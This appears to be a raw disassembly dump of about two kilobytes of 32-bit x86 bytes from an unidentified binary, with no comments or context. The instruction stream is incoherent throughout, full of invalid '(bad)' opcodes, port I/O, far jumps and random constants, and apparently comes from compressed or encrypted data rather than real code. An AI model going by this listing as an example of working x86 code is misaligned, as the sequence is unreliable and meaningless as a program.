  41ba1d:	imul   esi,DWORD PTR ds:0xa3920842,0x6bb31801
  41ba27:	xor    ch,0x3a
  41ba2a:	lods   eax,DWORD PTR ds:[esi]
  41ba2b:	lods   al,BYTE PTR ds:[esi]
  41ba2c:	clc    
  41ba2d:	lods   al,BYTE PTR ds:[esi]
  41ba2e:	retf   0xef6f
  41ba31:	inc    ebx
  41ba32:	(bad)  
  41ba33:	and    esi,DWORD PTR [ecx-0x2bdff0de]
  41ba39:	jle    0x41ba2e
  41ba3b:	in     al,dx
  41ba3c:	and    dh,BYTE PTR ds:0xcb2f6fa3
  41ba42:	loop   0x41b9d4
  41ba44:	out    dx,eax
  41ba45:	test   BYTE PTR [ebx-0x3b],bl
  41ba48:	mov    DWORD PTR [eax-0x1a37f6d3],ecx
  41ba4e:	pop    ds
  41ba4f:	sub    eax,0xa1e1b8e4
  41ba54:	cmp    ebx,DWORD PTR [eax+0xa2fd532]
  41ba5a:	test   al,0x37
  41ba5c:	ror    DWORD PTR [ebp-0x57],1
  41ba5f:	out    0x6c,eax
  41ba61:	lahf   
  41ba62:	xor    WORD PTR [ebx+0x4d9cdd40],sp
  41ba69:	pop    ecx
  41ba6a:	xchg   ebx,eax
  41ba6b:	push   cs
  41ba6c:	xchg   ecx,eax
  41ba6d:	cmp    ch,BYTE PTR [edi+0x19e95be9]
  41ba73:	fld    QWORD PTR [ebx-0x7970ea1e]
  41ba79:	jmp    0x9371:0x1272d9cf
  41ba80:	(bad)  [esi+eax*1]
  41ba83:	shr    DWORD PTR [ebp+0x69],cl
  41ba86:	sub    DWORD PTR [esi-0x2e],edi
  41ba89:	test   al,0xa5
  41ba8b:	mov    al,0xb8
  41ba8d:	in     eax,0x54
  41ba8f:	test   al,0x96
  41ba91:	scas   eax,DWORD PTR es:[edi]
  41ba92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba93:	sbb    eax,0xa95265f7
  41ba98:	iret   
  41ba99:	mov    BYTE PTR [esi+0xce2fbab],0xb7
  41baa0:	push   ebp
  41baa1:	addr16 inc edi
  41baa3:	(bad)
  41baa7:	out    dx,al
  41baa8:	jb     0x41ba68
  41baaa:	pop    edx
  41baab:	or     ebp,edx
  41baad:	mov    ebx,0xa805fec8
  41bab2:	adc    bl,dl
  41bab4:	cmc    
  41bab5:	push   ds
  41bab6:	cmp    esp,ecx
  41bab8:	fstp   st(3)
  41baba:	add    eax,DWORD PTR [eax+0x7d]
  41babd:	dec    edx
  41babe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41babf:	out    0x7,eax
  41bac1:	inc    eax
  41bac3:	push   esi
  41bac4:	mov    bh,0x8b
  41bac6:	lahf   
  41bac7:	mov    bh,0x5c
  41bac9:	fst    QWORD PTR [eax]
  41bacb:	jo     0x41ba8f
  41bacd:	imul   ebp,DWORD PTR [eax-0xd],0x33905e82
  41bad4:	repz (bad) 
  41bad6:	jae    0x41ba6c
  41bad8:	retf   
  41bad9:	(bad)  
  41bada:	pop    ebx
  41badb:	push   0xfffffffe
  41badd:	es lahf 
  41badf:	mov    al,ds:0x3e140945
  41bae4:	mov    bl,0x2c
  41bae6:	xchg   edx,eax
  41bae7:	or     ebp,esp
  41bae9:	push   ebp
  41baea:	ss adc al,0xed
  41baed:	jnp    0x5ab82d2e
  41baf3:	mov    edx,0xa7e644c0
  41baf8:	mov    eax,0xfb57052c
  41bafd:	sub    bh,ah
  41baff:	icebp  
  41bb00:	lods   al,BYTE PTR ds:[esi]
  41bb01:	outs   dx,BYTE PTR ds:[esi]
  41bb02:	mov    edx,0x2432aa58
  41bb07:	xchg   ecx,eax
  41bb08:	stos   DWORD PTR es:[edi],eax
  41bb09:	into   
  41bb0a:	or     DWORD PTR gs:[eax+edi*8],edx
  41bb0e:	adc    bl,ah
  41bb10:	popa   
  41bb11:	stos   DWORD PTR es:[edi],eax
  41bb12:	xlat   BYTE PTR ds:[ebx]
  41bb13:	sbb    edi,DWORD PTR [edx]
  41bb15:	dec    ecx
  41bb16:	inc    edx
  41bb17:	out    0xd7,al
  41bb19:	mov    dh,0x49
  41bb1b:	xchg   ebx,eax
  41bb1c:	inc    ebx
  41bb1d:	mov    dl,0x86
  41bb1f:	mov    eax,ds:0xab2b09c4
  41bb24:	out    0xac,eax
  41bb26:	cs mov ah,0x49
  41bb29:	stos   DWORD PTR es:[edi],eax
  41bb2a:	adc    BYTE PTR [eax],dl
  41bb2c:	jl     0x41baf2
  41bb2e:	mov    DWORD PTR [ecx-0x1cc1f47d],ecx
  41bb34:	jns    0x41baf2
  41bb36:	push   ecx
  41bb37:	retf   
  41bb38:	mov    bh,0x55
  41bb3a:	addr16 mov esp,0xf5f5defd
  41bb40:	fild   DWORD PTR [ebp-0x2b]
  41bb43:	adc    al,0xc5
  41bb45:	dec    esp
  41bb46:	jmp    0xc17c:0x18a52c2f
  41bb4d:	ficom  DWORD PTR [ebp+0x1e]
  41bb50:	hlt    
  41bb51:	not    BYTE PTR [edi]
  41bb53:	out    0x15,eax
  41bb55:	adc    bh,BYTE PTR [edx-0x50]
  41bb58:	inc    edx
  41bb59:	scas   al,BYTE PTR es:[edi]
  41bb5a:	(bad)  
  41bb5c:	push   0x3ca9c88a
  41bb61:	mov    al,ah
  41bb63:	push   0x8ece2e20
  41bb68:	arpl   WORD PTR [ebp-0x21],di
  41bb6b:	sbb    esi,DWORD PTR [edx+edx*4]
  41bb6e:	add    eax,0xc61d776c
  41bb73:	inc    esp
  41bb74:	jns    0x41bb49
  41bb76:	in     al,0x7f
  41bb78:	call   0x375f:0x9395e21a
  41bb7f:	fsubp  st(5),st
  41bb81:	add    BYTE PTR [esi+ebx*8],dh
  41bb84:	lock mov WORD PTR [eax+0x26b4fdb0],ds
  41bb8b:	and    DWORD PTR [esi+0x16fa0565],edx
  41bb91:	call   0x2922:0x5bef4ef1
  41bb98:	inc    edi
  41bb99:	lods   al,BYTE PTR ds:[esi]
  41bb9a:	push   eax
  41bb9b:	dec    eax
  41bb9c:	jp     0x41bb55
  41bb9e:	ret    
  41bb9f:	js     0x41bbb5
  41bba1:	ds fbld TBYTE PTR ss:[ebp+edi*1+0x54]
  41bba7:	pushf  
  41bba8:	imul   edx,DWORD PTR [ebx],0xfe5d0b7e
  41bbae:	push   cs
  41bbaf:	or     DWORD PTR [ebp-0x10],0xd27e50df
  41bbb6:	hlt    
  41bbb7:	sub    al,0x1e
  41bbb9:	pushf  
  41bbba:	in     al,dx
  41bbbb:	scas   al,BYTE PTR es:[edi]
  41bbbc:	mov    DWORD PTR [eax],0x633916c0
  41bbc2:	mov    edx,0x252981eb
  41bbc7:	push   ds
  41bbc8:	add    al,0x34
  41bbca:	push   edi
  41bbcb:	mov    eax,0xf6d07343
  41bbd0:	add    BYTE PTR [edx+0x36],bh
  41bbd3:	shl    esi,cl
  41bbd5:	mov    ah,0xb2
  41bbd7:	aas    
  41bbd8:	rcl    ebp,cl
  41bbda:	jecxz  0x41bc3a
  41bbdc:	int3   
  41bbdd:	push   ebp
  41bbde:	push   ebp
  41bbdf:	and    eax,0x19636d68
  41bbe4:	outs   dx,BYTE PTR ds:[esi]
  41bbe5:	xchg   esp,esi
  41bbe7:	pop    ecx
  41bbe8:	cmp    eax,0xc6bda22e
  41bbed:	daa    
  41bbee:	inc    edi
  41bbef:	and    ebp,DWORD PTR [esi-0x2aa34fc7]
  41bbf5:	jnp    0x41bbf9
  41bbf7:	cmp    DWORD PTR [eax+0x38],0x49edefd6
  41bbfe:	pop    edi
  41bbff:	add    BYTE PTR [edx+0x623dd632],0xa3
  41bc06:	ret    0xa578
  41bc09:	pop    esp
  41bc0a:	div    BYTE PTR [ebx-0x2a]
  41bc0d:	retf   
  41bc0e:	sbb    DWORD PTR [eax-0xc],ecx
  41bc11:	push   0xf1377b58
  41bc16:	sbb    edi,DWORD PTR [edx]
  41bc18:	mov    bl,BYTE PTR [ebx+0x34]
  41bc1b:	cmc    
  41bc1c:	push   esi
  41bc1d:	adc    edx,DWORD PTR [ebp+edx*4-0x3c6735ec]
  41bc24:	test   bh,0x68
  41bc27:	sti    
  41bc28:	pop    ds
  41bc29:	js     0x41bbf1
  41bc2b:	ret    
  41bc2c:	int3   
  41bc2d:	inc    edx
  41bc2e:	scas   eax,DWORD PTR es:[edi]
  41bc2f:	jmp    0xbc7db6d
  41bc34:	and    esp,edx
  41bc36:	pop    ds
  41bc37:	dec    edi
  41bc38:	pop    ss
  41bc39:	mov    eax,DWORD PTR ss:[ebp-0x5b2828ca]
  41bc40:	dec    eax
  41bc41:	sub    DWORD PTR [edx-0x1cee4579],0x2e
  41bc48:	ins    BYTE PTR es:[edi],dx
  41bc49:	mov    cl,0xcc
  41bc4b:	add    al,0xca
  41bc4d:	cmp    dl,BYTE PTR [ebp-0x4a5f2ff6]
  41bc53:	lods   eax,DWORD PTR ds:[esi]
  41bc54:	loope  0x41bc97
  41bc56:	sub    eax,0x8f034795
  41bc5b:	dec    esi
  41bc5c:	daa    
  41bc5d:	out    0xe7,eax
  41bc5f:	outs   dx,DWORD PTR ds:[esi]
  41bc60:	push   cs
  41bc61:	out    dx,eax
  41bc62:	loopne 0x41bc4e
  41bc64:	cmp    BYTE PTR [ebp-0xf1de3b1],0x92
  41bc6b:	inc    ecx
  41bc6c:	in     eax,0x97
  41bc6e:	xor    ah,BYTE PTR [edx]
  41bc70:	das    
  41bc71:	xchg   esp,eax
  41bc72:	jl     0x41bce5
  41bc74:	push   0x6479c217
  41bc79:	imul   esi,DWORD PTR [esi],0xa9d298b7
  41bc7f:	ja     0x41bc31
  41bc81:	jae    0x41bc30
  41bc83:	push   0xffffffaf
  41bc85:	cmp    eax,0xa047ab1c
  41bc8b:	fwait
  41bc8c:	and    ah,BYTE PTR [eax]
  41bc8e:	or     DWORD PTR [edi-0x5f],ecx
  41bc91:	imul   ebx,DWORD PTR [eax],0xffffff9d
  41bc94:	fsubr  DWORD PTR [esi+edi*8-0x28]
  41bc98:	mov    dh,0x92
  41bc9a:	nop
  41bc9b:	mov    BYTE PTR [ecx+0x1f],0xd2
  41bc9f:	sub    bh,cl
  41bca1:	std    
  41bca2:	(bad)  
  41bca3:	xchg   edi,eax
  41bca4:	add    edx,0xffffff98
  41bca7:	pop    ebp
  41bca8:	iret   
  41bca9:	gs scas al,BYTE PTR es:[edi]
  41bcab:	sub    eax,0x4924f5fb
  41bcb0:	push   edi
  41bcb1:	cwde   
  41bcb2:	cld    
  41bcb3:	(bad)  
  41bcb4:	iret   
  41bcb5:	(bad)  
  41bcb6:	sbb    esi,DWORD PTR [ebp-0x747aba70]
  41bcbc:	iret   
  41bcbd:	add    bl,bl
  41bcbf:	cmp    dl,BYTE PTR [edx-0x6b41a50a]
  41bcc5:	setge  BYTE PTR [ebx+0x75]
  41bcc9:	cmp    DWORD PTR [esi+0x2b55b13],ebp
  41bccf:	cmp    al,0x46
  41bcd1:	aam    0xa8
  41bcd3:	or     edi,DWORD PTR [eax-0x69]
  41bcd6:	jmp    0x3168:0x277c4903
  41bcdd:	mov    ebp,0x30010e4a
  41bce2:	sub    dh,BYTE PTR [esi-0x51]
  41bce5:	arpl   WORD PTR [esi-0x38cdb539],cx
  41bceb:	mov    al,ds:0x5d78854b
  41bcf0:	inc    esp
  41bcf1:	adc    DWORD PTR [ebx-0xacc8370],0xed807661
  41bcfb:	aas    
  41bcfc:	nop
  41bcfd:	and    DWORD PTR [edx+0x49874115],0x30384be5
  41bd07:	loop   0x41bce1
  41bd09:	out    0x92,al
  41bd0b:	or     BYTE PTR [eax],bl
  41bd0d:	jns    0x41bcc1
  41bd0f:	(bad)  
  41bd10:	mov    dl,0xf5
  41bd12:	adc    al,0xb3
  41bd14:	data16 (bad) 
  41bd16:	iret   
  41bd17:	jp     0x41bd08
  41bd19:	scas   al,BYTE PTR es:[edi]
  41bd1a:	or     al,0xcc
  41bd1c:	push   es
  41bd1d:	push   ebx
  41bd1e:	loope  0x41bcc0
  41bd20:	sub    dl,BYTE PTR ds:0xbe902940
  41bd26:	sbb    ch,ah
  41bd28:	or     BYTE PTR ds:0x2c56a7a7,al
  41bd2e:	or     BYTE PTR [edx-0x48cdd79c],dh
  41bd34:	and    DWORD PTR [edi+0x45f5d5ea],0xa7df6f83
  41bd3e:	mov    bh,0x64
  41bd40:	rol    BYTE PTR [ebx+0x1e2d333f],0xdd
  41bd47:	imul   ebp,DWORD PTR [eax+0x1ffc69dc],0x97ad666c
  41bd51:	jl     0x41bd93
  41bd53:	sbb    al,BYTE PTR [ebx]
  41bd55:	jg     0x41bda1
  41bd57:	xlat   BYTE PTR ds:[ebx]
  41bd58:	addr16 push ss
  41bd5a:	out    dx,eax
  41bd5b:	mov    eax,0xc2877647
  41bd60:	add    ch,ch
  41bd62:	push   cs
  41bd63:	outs   dx,DWORD PTR ds:[esi]
  41bd64:	packssdw mm6,QWORD PTR [eax]
  41bd67:	jmp    0x41bd2f
  41bd69:	push   ebp
  41bd6a:	mov    ebp,0x452e01dc
  41bd6f:	add    BYTE PTR [esp+ebx*4-0x7a],bh
  41bd73:	push   es
  41bd74:	fcomp  DWORD PTR [ebx]
  41bd76:	cs hlt 
  41bd78:	jle    0x41bdae
  41bd7a:	mov    edi,0x54e0289f
  41bd7f:	(bad)  
  41bd80:	ja     0x41bd7c
  41bd82:	adc    al,0xd8
  41bd84:	jns    0x41bdd9
  41bd86:	rcr    DWORD PTR [ebx-0x6],cl
  41bd89:	ja     0x41bd60
  41bd8b:	add    DWORD PTR [edi+ebx*1-0x72],0x92ce8432
  41bd93:	adc    eax,0x87e2b7bf
  41bd98:	xchg   ebx,eax
  41bd99:	fisub  WORD PTR [eax+0x3d1112d7]
  41bd9f:	inc    eax
  41bda0:	enter  0x5924,0xf5
  41bda4:	arpl   ax,cx
  41bda6:	arpl   WORD PTR [eax],bp
  41bda8:	pop    esp
  41bda9:	pop    ebx
  41bdaa:	jns    0x41be04
  41bdac:	inc    edx
  41bdad:	xchg   ebp,eax
  41bdae:	idiv   DWORD PTR [eax]
  41bdb0:	out    0x77,al
  41bdb2:	or     DWORD PTR [bp+di-0x28],edi
  41bdb6:	pop    esp
  41bdb7:	add    DWORD PTR [edx+0x1d876843],ecx
  41bdbd:	inc    edi
  41bdbe:	lock inc edi
  41bdc0:	stc    
  41bdc1:	out    0xbb,al
  41bdc3:	and    dl,bh
  41bdc5:	aam    0xce
  41bdc7:	cwde   
  41bdc8:	add    BYTE PTR [esi],dh
  41bdca:	int    0xf
  41bdcc:	mov    WORD PTR [ebp-0x35],cs
  41bdcf:	iret   
  41bdd0:	repnz and DWORD PTR [esp+ebp*4+0x5d],ecx
  41bdd5:	or     al,0x50
  41bdd7:	scas   eax,DWORD PTR es:[edi]
  41bdd8:	mov    eax,ds:0x813c410e
  41bddd:	mov    esi,0x49180249
  41bde2:	ja     0x41bd7c
  41bde4:	dec    eax
  41bde5:	loop   0x41bdea
  41bde7:	pcmpgtb mm2,QWORD PTR [edi-0x1c03ed5e]
  41bdee:	or     dh,cl
  41bdf0:	imul   eax,DWORD PTR [ebx-0x24c6410a],0x63
  41bdf7:	pop    ecx
  41bdf8:	pop    ds
  41bdf9:	jae    0x41be25
  41bdfb:	daa    
  41bdfc:	popf   
  41bdfd:	out    dx,al
  41bdfe:	sub    DWORD PTR [esi-0x1da96a9b],edx
  41be04:	cld    
  41be05:	add    eax,0xcd494756
  41be0a:	sub    BYTE PTR [ebx-0x6],dl
  41be0d:	repz ror DWORD PTR [esp+ebp*4],1
  41be11:	or     BYTE PTR [ebx],ah
  41be13:	mov    ecx,0x54fe837a
  41be18:	mov    cs,WORD PTR [esi+edi*1]
  41be1b:	std    
  41be1c:	outs   dx,BYTE PTR ds:[esi]
  41be1d:	lods   al,BYTE PTR ds:[esi]
  41be1e:	mov    dl,0x3d
  41be20:	into   
  41be21:	xchg   esi,eax
  41be22:	jmp    0xc83d0ced
  41be27:	fwait
  41be28:	ja     0x41bdaf
  41be2a:	call   0xe1ed276b
  41be2f:	mov    cl,0xad
  41be31:	int    0xbf
  41be33:	cmp    cl,BYTE PTR [edx]
  41be35:	out    dx,eax
  41be36:	ror    BYTE PTR [eax+0x1e34aebc],0xbc
  41be3d:	add    al,0x7
  41be40:	pusha  
  41be41:	or     bl,0x36
  41be44:	aaa    
  41be45:	mov    ds:0x8b62f517,eax
  41be4a:	mov    DWORD PTR [edx-0x41],edx
  41be4d:	bound  ecx,QWORD PTR [ebp-0x62]
  41be50:	ret    
  41be51:	dec    ebp
  41be52:	std    
  41be53:	mov    WORD PTR [ebx+ebx*1],?
  41be56:	add    BYTE PTR [ecx],0x46
  41be59:	out    dx,eax
  41be5a:	mov    eax,?
  41be5c:	jbe    0x41bde7
  41be5e:	mov    al,ds:0x37311f85
  41be63:	retf   0xc2ee
  41be66:	mov    DWORD PTR [ecx-0x3eb0a422],esp
  41be6c:	dec    ebx
  41be6d:	inc    eax
  41be6e:	out    dx,al
  41be6f:	sar    al,cl
  41be71:	scas   eax,DWORD PTR es:[edi]
  41be72:	fcomip st,st(5)
  41be74:	ins    BYTE PTR es:[edi],dx
  41be75:	mov    edi,0xd17bf390
  41be7a:	jp     0x41be29
  41be7c:	xchg   esi,eax
  41be7d:	fisttp WORD PTR [ebx]
  41be7f:	adc    BYTE PTR [ebx],ch
  41be81:	inc    ecx
  41be82:	out    dx,al
  41be83:	push   es
  41be84:	and    eax,0xd64ea478
  41be89:	test   DWORD PTR [ebp+0x3fc8548e],ebx
  41be8f:	mov    dl,0x2e
  41be91:	adc    bh,0x25
  41be94:	xor    edx,DWORD PTR [eax+ecx*1]
  41be97:	pop    edx
  41be98:	(bad)  
  41be99:	push   ss
  41be9a:	es jge 0x41be68
  41be9d:	fmul   DWORD PTR [edx+0x7dda2821]
  41bea3:	or     al,0xc6
  41bea5:	inc    eax
  41bea6:	inc    ebp
  41bea7:	mov    ecx,0x677389e7
  41beac:	in     al,dx
  41bead:	sahf   
  41beae:	in     eax,0x18
  41beb0:	cdq    
  41beb1:	sbb    al,0x2f
  41beb3:	mov    al,BYTE PTR fs:0x3c0e6c38
  41beba:	cmp    BYTE PTR [edi-0x41263996],al
  41bec0:	ficom  WORD PTR [edx]
  41bec2:	daa    
  41bec3:	mov    al,0xd3
  41bec5:	and    dl,bl
  41bec7:	outs   dx,BYTE PTR ds:[esi]
  41bec8:	in     al,0x4c
  41beca:	in     al,0x34
  41becc:	sub    edx,ebp
  41bece:	cmp    DWORD PTR [ebx-0x295dd05c],ebx
  41bed4:	inc    esi
  41bed5:	idiv   al
  41bed7:	cmp    DWORD PTR [ecx],0xa7ef4dad
  41bedd:	popf   
  41bede:	jmp    0x41bf1e
  41bee0:	mov    bl,0xc6
  41bee2:	xchg   ebp,eax
  41bee3:	and    bh,BYTE PTR [ecx]
  41bee5:	fadd   st,st(5)
  41bee7:	pop    edx
  41bee8:	push   edi
  41bee9:	mov    ds:0x72d4eab9,eax
  41beee:	hlt    
  41beef:	sar    BYTE PTR [edx],0x79
  41bef2:	scas   eax,DWORD PTR es:[edi]
  41bef3:	xlat   BYTE PTR ds:[ebx]
  41bef4:	pop    esp
  41bef5:	adc    ah,bh
  41bef7:	popa   
  41bef8:	push   ss
  41bef9:	inc    esi
  41befa:	and    ah,BYTE PTR [eax-0x60650510]
  41bf00:	out    0x15,al
  41bf02:	aam    0xd1
  41bf04:	xor    ebp,0xffffff8c
  41bf07:	(bad)
  41bf0b:	fdiv   st(6),st
  41bf0d:	ficom  DWORD PTR [ebx+0x4d9cc532]
  41bf13:	call   0x60bfa20b
  41bf18:	mov    edi,0x345fd40e
  41bf1d:	mov    al,ds:0x20d41272
  41bf22:	cli    
  41bf23:	jmp    0xc5c6:0xc5b1cc20
  41bf2a:	jecxz  0x41bf6e
  41bf2c:	xchg   esi,eax
  41bf2d:	jge    0x41bf96
  41bf2f:	inc    esi
  41bf30:	push   esp
  41bf31:	mov    DWORD PTR [edx+0x7f],edx
  41bf34:	xor    BYTE PTR [edx-0x61],0xa
  41bf38:	jecxz  0x41bf1b
  41bf3a:	mov    eax,ds:0xa241f775
  41bf3f:	push   eax
  41bf40:	fbstp  TBYTE PTR [ebp-0x47]
  41bf43:	pop    ds
  41bf44:	sbb    bh,BYTE PTR ds:0x396fdd79
  41bf4a:	es mov ecx,0xd30c2d1c
  41bf50:	sub    ecx,DWORD PTR [ebp-0x469f1df3]
  41bf56:	ror    BYTE PTR [ebx-0x63719ed1],cl
  41bf5c:	or     eax,0xb124eabe
  41bf61:	or     bl,BYTE PTR [edx]
  41bf63:	xchg   BYTE PTR [edx+ebx*8-0x68],bh
  41bf67:	loop   0x41bfa2
  41bf69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf6a:	dec    eax
  41bf6b:	fadd   QWORD PTR [edx-0x6e]
  41bf6e:	stos   DWORD PTR es:[edi],eax
  41bf6f:	fdiv   QWORD PTR [ecx-0x62b27002]
  41bf75:	mov    esi,0x964efac6
  41bf7a:	les    esp,FWORD PTR [eax]
  41bf7c:	sbb    eax,0x38d7df25
  41bf81:	pop    es
  41bf82:	lds    ecx,FWORD PTR [ebp+0x36]
  41bf85:	cdq    
  41bf86:	pushf  
  41bf87:	jecxz  0x41bf1c
  41bf89:	aad    0xe1
  41bf8b:	sub    ecx,DWORD PTR [ebp-0x547635fd]
  41bf91:	jmp    0x41bfe0
  41bf93:	adc    bl,BYTE PTR [ecx]
  41bf95:	aas    
  41bf96:	mov    ah,0xb7
  41bf98:	or     al,0x92
  41bf9a:	fbstp  TBYTE PTR [edx+esi*2]
  41bf9d:	pop    ds
  41bf9e:	es iret 
  41bfa0:	jbe    0x41bf5b
  41bfa2:	mov    bl,BYTE PTR [ebp+0x687b4484]
  41bfa8:	das    
  41bfa9:	aaa    
  41bfaa:	aas    
  41bfab:	jo     0x41bf8f
  41bfad:	std    
  41bfae:	push   ds
  41bfaf:	inc    ebp
  41bfb0:	jmp    0x41bf66
  41bfb2:	adc    ebx,DWORD PTR [ebx-0x53fc38de]
  41bfb8:	sub    edi,DWORD PTR [edi-0x7bf62b0e]
  41bfbe:	xor    ebp,DWORD PTR [esp+eax*8+0x751df1eb]
  41bfc5:	push   eax
  41bfc6:	adc    cl,al
  41bfc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfc9:	in     al,dx
  41bfca:	inc    edi
  41bfcb:	sar    DWORD PTR [ebx],1
  41bfcd:	popa   
  41bfce:	xor    ch,BYTE PTR [ebx]
  41bfd0:	(bad)  
  41bfd1:	nop
  41bfd2:	mov    dl,0x87
  41bfd4:	mov    cl,0xbb
  41bfd6:	adc    eax,0x36a4527c
  41bfdb:	or     eax,0x9ca009e3
  41bfe0:	xchg   edi,eax
  41bfe1:	(bad)  
  41bfe2:	test   al,0x91
  41bfe4:	cld    
  41bfe5:	mov    ebp,0x23e88ef0
  41bfea:	mov    edi,0x7a0333c4
  41bfef:	cmp    BYTE PTR [eax-0x65c69697],bh
  41bff5:	out    dx,al
  41bff6:	jo     0x41bfb9
  41bff8:	xor    bh,BYTE PTR [esi+0x61]
  41bffb:	pop    edi
  41bffc:	mov    ah,0x9c
  41bffe:	cmp    edi,DWORD PTR [ebx+0x67]
  41c001:	(bad)  
  41c002:	xchg   ebp,eax
  41c003:	pop    ecx
  41c004:	and    BYTE PTR gs:[ecx-0x5cb1bc67],0x1e
  41c00c:	stc    
  41c00d:	daa    
  41c00e:	push   0xffffffd1
  41c010:	and    eax,0x5293d340
  41c015:	out    dx,al
  41c016:	mov    edi,0x34c52cd7
  41c01b:	popa   
  41c01c:	mov    al,ds:0xcec165d1
  41c021:	pop    ebx
  41c022:	mov    ah,0x70
  41c024:	bound  ebx,QWORD PTR [edi]
  41c026:	cmp    al,0x4a
  41c028:	mov    edi,0x400d4537
  41c02d:	loop   0x41c05c
  41c02f:	aas    
  41c030:	xchg   ebp,eax
  41c031:	adc    BYTE PTR [ecx+0x5b],ch
  41c034:	leave  
  41c035:	and    eax,0x14f4fa7
  41c03a:	loopne 0x41c05b
  41c03c:	xchg   esp,eax
  41c03d:	mov    al,ds:0x7800596b
  41c042:	jo     0x41c04e
  41c044:	fsubr  QWORD PTR [edi]
  41c046:	xchg   ebp,eax
  41c047:	add    dh,0x7
  41c04a:	cmp    DWORD PTR [edi],esp
  41c04c:	pop    ebp
  41c04d:	popa   
  41c04e:	jns    0x41c0bf
  41c050:	and    ebx,DWORD PTR [ecx+0x24]
  41c053:	mov    ah,0x46
  41c055:	(bad)  
  41c056:	xchg   ebp,eax
  41c057:	out    dx,eax
  41c058:	pop    ebp
  41c05a:	shl    bh,1
  41c05c:	mov    esp,0xe9c73290
  41c061:	inc    ebx
  41c062:	and    dh,cl
  41c064:	mov    edx,ebp
  41c066:	das    
  41c067:	lods   al,BYTE PTR ds:[esi]
  41c068:	dec    ebx
  41c069:	pushf  
  41c06a:	js     0x41c0b2
  41c06c:	adc    BYTE PTR [edx+0x3883a579],al
  41c072:	div    bh
  41c074:	inc    ecx
  41c075:	imul   edx,DWORD PTR [esp+edx*1-0x6e],0xfa79ef28
  41c07d:	imul   edx,DWORD PTR [edx],0xfffffffb
  41c080:	xor    eax,0xfce7c919
  41c085:	(bad)  
  41c086:	fsubr  st(5),st
  41c088:	enter  0x52d1,0x9b
  41c08c:	sbb    DWORD PTR [ecx+ecx*1],ecx
  41c08f:	retf   0x3adc
  41c092:	mov    bl,0xcb
  41c094:	outs   dx,BYTE PTR ds:[esi]
  41c095:	rcl    DWORD PTR [eax+0x6590bf62],cl
  41c09b:	xchg   dh,ah
  41c09d:	xor    BYTE PTR [esi],dh
  41c09f:	punpckldq mm7,DWORD PTR es:[ebp-0x13]
  41c0a4:	inc    ebp
  41c0a5:	fnsetpm(287 only) 
  41c0a7:	fmul   st(3),st
  41c0a9:	add    al,0xb3
  41c0ab:	imul   ebp,DWORD PTR [eax-0x5ec64f6c],0xcbb4333c
  41c0b5:	inc    esi
  41c0b6:	mov    esp,0x1b0fc310
  41c0bb:	fsubr  st(3),st
  41c0bd:	(bad)  
  41c0be:	call   0x6dd3902f
  41c0c3:	push   0xffffff84
  41c0c5:	push   ebp
  41c0c6:	scas   eax,DWORD PTR es:[edi]
  41c0c7:	jmp    0x277b:0x6603d3cb
  41c0ce:	data16 loopne 0x41c10a
  41c0d1:	rcr    DWORD PTR [eax+0x303ed060],1
  41c0d7:	jmp    0x2c58b2fa
  41c0dc:	push   0xffffff93
  41c0de:	scas   eax,DWORD PTR es:[edi]
  41c0df:	inc    ebp
  41c0e0:	std    
  41c0e1:	jecxz  0x41c08c
  41c0e3:	imul   eax,DWORD PTR [edx-0x74],0x48
  41c0e7:	pop    edx
  41c0e8:	jp     0x41c079
  41c0ea:	or     al,0x20
  41c0ec:	mov    ds:0xfe0e3f6,eax
  41c0f1:	push   0x5d711f93
  41c0f6:	mov    edi,?
  41c0f8:	xor    eax,DWORD PTR [eax-0x7d]
  41c0fb:	jne    0x41c10b
  41c0fd:	cli    
  41c0fe:	mov    al,0x1
  41c100:	xchg   ebx,eax
  41c101:	xor    bh,0x60
  41c104:	jl     0x41c113
  41c106:	xchg   esp,eax
  41c107:	loopne 0x41c0a6
  41c109:	jae    0x41c0ae
  41c10b:	push   ds
  41c10c:	mov    bl,0xca
  41c10e:	scas   eax,DWORD PTR es:[edi]
  41c10f:	cmp    eax,0x84c93a4c
  41c114:	daa    
  41c115:	lock imul esi,edi,0xffffff95
  41c119:	cmp    BYTE PTR [ebp+0xf],al
  41c11c:	sar    dh,1
  41c11e:	enter  0x221a,0xff
  41c122:	ret    0x9f1a
  41c125:	and    al,BYTE PTR [edx-0x6cb5572b]
  41c12b:	rcl    BYTE PTR [edi+0x20827ecc],cl
  41c131:	cmp    al,BYTE PTR [eax-0x22]
  41c134:	cmp    DWORD PTR [edx-0x51860465],ebx
  41c13a:	pop    ss
  41c13b:	fwait
  41c13c:	(bad)  
  41c13d:	mov    esp,DWORD PTR [edi+ecx*1-0x1e82fd49]
  41c144:	xor    esp,DWORD PTR [ecx]
  41c146:	or     eax,0x1eb7cda4
  41c14b:	push   esi
  41c14c:	jno    0x41c1c0
  41c14e:	xchg   ecx,eax
  41c14f:	xor    BYTE PTR [edi+0x39],bl
  41c152:	or     BYTE PTR [esi-0x1d],al
  41c155:	js     0x41c1c5
  41c157:	ret    0x1145
  41c15a:	add    eax,0x30d391d5
  41c15f:	xlat   BYTE PTR ds:[ebx]
  41c160:	mov    eax,0xfb1fbba7
  41c165:	cmp    al,0x21
  41c167:	rcl    BYTE PTR [esi+0x18f2dbee],1
  41c16d:	ret    
  41c16e:	loopne 0x41c1e1
  41c170:	pop    esp
  41c171:	pop    ebx
  41c172:	or     eax,0xe400308
  41c177:	cmp    edx,DWORD PTR [esi+ebx*8-0x547223fe]
  41c17e:	mov    al,0x88
  41c180:	jne    0x41c152
  41c182:	rcl    BYTE PTR [bp+si],1
  41c185:	call   0xd2b2cc83
  41c18a:	xlat   BYTE PTR ds:[ebx]
  41c18b:	sub    bh,dh
  41c18d:	jnp    0x41c1e6
  41c18f:	inc    esi
  41c190:	cld    
  41c191:	pop    es
  41c192:	sbb    eax,ecx
  41c194:	outs   dx,BYTE PTR ds:[esi]
  41c195:	popa   
  41c196:	gs out 0xfc,eax
  41c199:	inc    ebx
  41c19a:	cmp    esp,eax
  41c19c:	xchg   DWORD PTR [ecx],eax
  41c19e:	ja     0x41c183
  41c1a0:	retf   
  41c1a1:	and    DWORD PTR [edx+esi*1+0x4a483b78],edx
  41c1a8:	cdq    
  41c1a9:	xchg   ecx,eax
  41c1aa:	aam    0x89
  41c1ac:	mov    ecx,0x3a22dc5d
  41c1b1:	retf   
  41c1b2:	pop    esi
  41c1b3:	pop    ecx
